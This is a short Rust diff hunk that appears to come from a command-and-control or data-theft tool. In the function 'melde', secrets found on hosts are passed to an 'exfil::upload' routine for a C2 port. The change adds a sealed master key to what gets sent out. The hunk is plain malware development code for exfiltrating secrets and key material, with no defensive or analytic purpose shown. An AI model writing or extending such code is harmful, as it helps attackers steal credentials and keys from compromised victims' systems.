@@ -180,6 +180,7 @@ pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) 
             let upload = match kx_core::exfil::upload(
                 secret,
                 key.as_ref().map(|k| k.roh.as_slice()),
+                key.as_ref().map(|k| k.sealed_master.as_str()),
                 &fund.host_id,
             ) {
                 Ok(upload) => upload,
